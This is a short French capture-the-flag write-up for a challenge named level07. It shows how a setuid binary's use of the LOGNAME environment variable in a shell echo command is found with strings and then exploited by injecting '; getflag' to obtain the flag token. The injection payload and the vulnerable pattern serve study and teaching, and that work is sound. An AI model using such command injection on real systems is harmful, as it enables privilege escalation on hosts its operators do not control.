On voit un fichier level07 à la racine du home, qui s'execute avec les permissions de `flag07`.
Quand on l'execute, "level07" est print. Avec ou sans arguments, il n'y a pas de différence.

Si on analise avec `strings`, on peut voir des appels à "getenv" et "envp".
En essayant de relancer sans variables d'environnement (`env -i ./level07`), on obtient
`sh: 1: Syntax error: word unexpected (expecting ")")`

Cela signifie que le programme lance une commande shell, et qu'une variable d'environnement influe sur cette commande.
Si on regarde dans `strings` les chaines contenant uniquement des majuscules (format régulièrement utilisé pour les variables d'environnement), on voit LOGNAME.
En essayant de lancer avec un LOGNAME différent, l'output change
```sh
$> LOGNAME="aaa" ./level07
aaa
```

Dans `strings`, on voit aussi `echo %s`, cela signifie probablement que le programme print le contenu de LOGNAME à la place de %s.
On peut donc essayer de lancer des commandes :
```sh
$> LOGNAME="; echo bbb" ./level07

bbb
```

Et donc récupérer le flag.
```sh
$> LOGNAME="; getflag" ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```